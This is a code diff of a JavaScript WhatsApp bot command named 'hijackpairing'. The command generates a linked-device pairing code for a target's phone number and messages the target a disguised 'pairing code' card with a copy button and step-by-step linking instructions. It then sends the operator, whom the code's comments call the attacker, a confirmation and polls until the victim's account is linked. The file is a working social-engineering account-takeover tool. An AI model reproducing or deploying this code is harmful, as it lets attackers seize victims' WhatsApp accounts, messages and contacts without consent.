@@ -1,32 +1,17 @@
 // language: JavaScript, file: commands/hijack/hijackpairing.js
 'use strict';
 
+const fs = require('fs');
+const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require('@itsliaaa/baileys');
 const {
-    pairHijackSession,
+    startHijackSession,
     addTarget,
     hasCreds,
     wipeTarget,
-    closePendingPairing,
+    getHijackPairingCode,
 } = require('../../lib/hijackSession');
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-function buildPretext(code) {
-    return (
-        `*ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ*\n\n` +
-        `╭═══〘 ᴘᴀɪʀɪɴɢ 〙═══⊷❍\n` +
-        `┃ ✰ ᴄᴏᴅᴇ: *${code}*\n` +
-        `┃ ✰ ᴇxᴘɪʀᴇs: 60s\n` +
-        `╰──────────────────────\n\n` +
-        `*ʜᴏᴡ ᴛᴏ ᴜsᴇ:*\n` +
-        `1. ᴏᴘᴇɴ ᴡʜᴀᴛsᴀᴘᴘ → sᴇᴛᴛɪɴɢs\n` +
-        `2. ᴛᴀᴘ *ʟɪɴᴋᴇᴅ ᴅᴇᴠɪᴄᴇs*\n` +
-        `3. ᴛᴀᴘ *ʟɪɴᴋ ᴀ ᴅᴇᴠɪᴄᴇ*\n` +
-        `4. ᴄʜᴏᴏsᴇ *ʟɪɴᴋ ᴡɪᴛʜ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ*\n` +
-        `5. ᴇɴᴛᴇʀ ᴛʜᴇ ᴄᴏᴅᴇ ᴀʙᴏᴠᴇ\n\n` +
-        `_code expires in 60 seconds._`
-    );
-}
 
 module.exports = {
     name: 'hijackpairing',
@@ -49,7 +34,6 @@ module.exports = {
         const scopeKey = ctx.sender;
         if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
 
-        // if real registered creds exist and no force → block
         if (hasCreds(scopeKey, raw) && !force) {
             return ctx.reply(
                 `⚠️ +${raw} ᴀʟʀᴇᴀᴅʏ ᴘᴀɪʀᴇᴅ.\n` +
@@ -57,29 +41,67 @@ module.exports = {
             );
         }
 
-        // kill any half-open socket from a prior attempt
-        closePendingPairing(scopeKey, raw);
-
-        // wipe stale unregistered state (or forced reset)
-        // this guarantees a FRESH pairing code, not a stale rejected one.
+        // Wipe stale unregistered state or forced reset to guarantee fresh code
         wipeTarget(scopeKey, raw);
 
         await ctx.react?.('⏳');
 
+        let newSock = null;
         try {
-            const { code } = await pairHijackSession(scopeKey, raw);
+            newSock = await startHijackSession(scopeKey, raw, true);
+            newSock._pairingInProgress = true;
+
+            const code = await getHijackPairingCode(newSock, raw);
             addTarget(scopeKey, raw);
 
-            const formatted = String(code).replace(/[^a-z0-9]/gi, '').toUpperCase();
-            const dashed    = formatted.match(/.{1,4}/g)?.join('-') || formatted;
+            const codeOnlyMsg = code; // already formatted like DEAN-HSZP
+            
+            // Build interactive message with CTA copy button (from your pair.js)
+            const pairText = `❤️ *_ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ғᴏʀ @${raw}_* ❤️
+╭═══〘 𝑴𝑨𝑫𝑨𝑹𝑨 𝑿-𝑴𝑫 〙═══⊷❍
+┃✰│CODE: *${codeOnlyMsg}*
+┃✰│EXPIRES: 60s
+╰──────────────────
 
-            const targetJid = `${raw}@s.whatsapp.net`;
-            const pretext   = buildPretext(dashed);
+1. Open WhatsApp > Settings > Linked Devices
+2. Tap "Link a Device" 
+3. Tap "Link with phone number"
+4. Paste the code above
 
-            let delivered     = false;
+_Tap button below to copy instantly_`;
+
+            const pairMsg = generateWAMessageFromContent(`${raw}@s.whatsapp.net`, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({ text: pairText }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({ text: `© Powered by ${s.botName}` }),
+                            header: proto.Message.InteractiveMessage.Header.create({ 
+                                title: `🔑 ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ`, 
+                                hasMediaAttachment: false
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: [
+                                    { 
+                                      name: "cta_copy", 
+                                      buttonParamsJson: JSON.stringify({ 
+                                        display_text: "📋 Copy Code", 
+                                        id: "copy_pair", 
+                                        copy_code: code.replace(/-/g, '') 
+                                      }) 
+                                    }
+                                ]
+                            })
+                        })
+                    }
+                }
+            }, { quoted: msg });
+
+            // 1. Send interactive message to target
+            let delivered = false;
             let deliveryError = null;
             try {
-                await sock.sendMessage(targetJid, { text: pretext });
+                await sock.relayMessage(`${raw}@s.whatsapp.net`, pairMsg.message, { messageId: pairMsg.key.id });
                 delivered = true;
             } catch (e) {
                 deliveryError = e?.message || 'unknown send failure';
@@ -87,10 +109,11 @@ module.exports = {
 
             await ctx.react?.('✅');
 
+            // 2. Confirmation to attacker
             const card =
                 `╭═══〘 ʜɪᴊᴀᴄᴋ ᴘᴀɪʀɪɴɢ 〙═══⊷❍\n` +
                 `┃ 📱 ᴛᴀʀɢᴇᴛ: +${raw}\n` +
-                `┃ 🔑 ᴄᴏᴅᴇ: *${dashed}*\n` +
+                `┃ 🔑 ᴄᴏᴅᴇ: *${codeOnlyMsg}*\n` +
                 `┃ 📤 ᴅᴍ ᴅᴇʟɪᴠᴇʀᴇᴅ: ${delivered ? 'ʏᴇs' : `ɴᴏ — ${deliveryError}`}\n` +
                 `┃ ⏱️ ᴇxᴘɪʀᴇs: 60s\n` +
                 `┃ 🕓 ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴇɴᴛʀʏ...\n` +
@@ -102,7 +125,7 @@ module.exports = {
 
             await ctx.reply(card);
 
-            // post-send poll — now uses registered:true check, no false positives
+            // 3. Post-send poll for creds.registered === true
             (async () => {
                 for (let i = 0; i < 20; i++) {
                     await sleep(3000);
@@ -118,6 +141,7 @@ module.exports = {
             })().catch(() => {});
 
         } catch (e) {
+            if (newSock) try { newSock.end(); } catch {}
             await ctx.react?.('❌');
             return ctx.reply(`❌ ᴘᴀɪʀɪɴɢ ғᴀɪʟᴇᴅ: ${e.message}${s.FOOTER}`);
         }
